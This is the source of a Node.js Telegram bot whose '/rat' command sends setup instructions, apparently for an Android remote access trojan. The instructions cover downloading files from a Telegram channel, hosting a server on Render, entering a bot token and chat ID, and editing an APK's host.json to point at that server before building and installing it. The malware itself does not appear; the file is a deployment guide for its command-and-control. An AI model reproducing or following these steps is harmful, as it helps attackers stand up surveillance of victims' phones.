require("dotenv").config();
const { Telegraf } = require("telegraf");
const express = require("express");

const app = express();
const bot = new Telegraf(process.env.BOT_TOKEN);

// ✅ /start command (Fully Escaped)
bot.start((ctx) => {
  ctx.reply(
    "\\_\\_👋 Hello\\! How can I assist you today\\?\\_\\_",
    { parse_mode: "MarkdownV2" }
  );
});

// ✅ /rat command (Proper Escaping)
bot.command("rat", (ctx) => {
  ctx.reply(
    `🚀 \\_\\_How to Deploy on Render\\_\\_  

📂 \\_\\_Step 1\\:\\_\\_ [📥 Download Required Files](https://t.me/ghnxxheats/48)  

🛠 \\_\\_Step 2\\:\\_\\_ Create a \\_GitHub Account\\_  

📦 \\_\\_Step 3\\:\\_\\_ Create a \\_Private Repo\\_ & Upload These Files\\:  
   • 📄 \`server\\.js\`  
   • 📄 \`package\\.json\`  
   • 📄 \`data\\.json\`  

🌐 \\_\\_Step 4\\:\\_\\_ Go to [Render\\.com](https://render.com)  
   • 🔹 Sign up with \\_GitHub\\_  
   • 🔹 Confirm your account  
   • 🔹 Connect your \\_GitHub account\\_ to Render  

⚡ \\_\\_Step 5\\:\\_\\_ Create a \\_New Web Service\\_  
   • 🔹 Click **New Web Service**  
   • 🔹 Select **Free Trial**  
   • 🔹 Choose any \\_random service name\\_  
   • 🔹 Select your \\_GitHub repo\\_ \\(it will start deploying automatically\\)  

🔗 \\_\\_Step 6\\:\\_\\_ Copy Your \\_Web Service URL\\_  

🛠 \\_\\_Step 7\\:\\_\\_ Edit \`data\\.json\` in Your GitHub Repo  
   • 🔹 Enter your \\_Bot Token\\_, \\_Chat ID\\_, and \\_Web Service URL\\_  
   • 🔹 Save the file  

🚀 \\_\\_Step 8\\:\\_\\_ Go Back to \\_Render\\_  
   • 🔹 Open your project  
   • 🔹 Click **Deploy Latest Commits**  

⌛ \\_\\_Step 9\\:\\_\\_ Wait a few seconds\\.\\.\\.  
✅ Once the terminal shows **LIVE**, go to Telegram and start your bot\\!  

📲 \\_\\_APK Editing Guide\\_\\_  

1️⃣ Open \\_APK Editor\\_  
2️⃣ Select \\_Your APK\\_ → Choose \\_Full Edit\\_ → Select \\_Decode All Files\\_  
3️⃣ Navigate to \\_assets\\_ Folder → Open \`host\\.json\`  
4️⃣ Paste Your \\_Web Service URL\\_  
5️⃣ **Build APK** → Install & Enjoy\\!  

📥 **[Download Required Files](https://t.me/ghnxxheats/48)**  

💡 \\_Need help\\? Feel free to ask\\!\\_ 🚀`,
    { parse_mode: "MarkdownV2" }
  );
});

// Start bot polling
bot.launch();
console.log("🤖 Bot is running...");

// Start Express server
app.get("/", (req, res) => {
  res.send("✅ Telegram Bot is Running!");
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🌍 Server running on port ${PORT}`));

// Graceful stop on exit
process.once("SIGINT", () => bot.stop("SIGINT"));
process.once("SIGTERM", () => bot.stop("SIGTERM"));
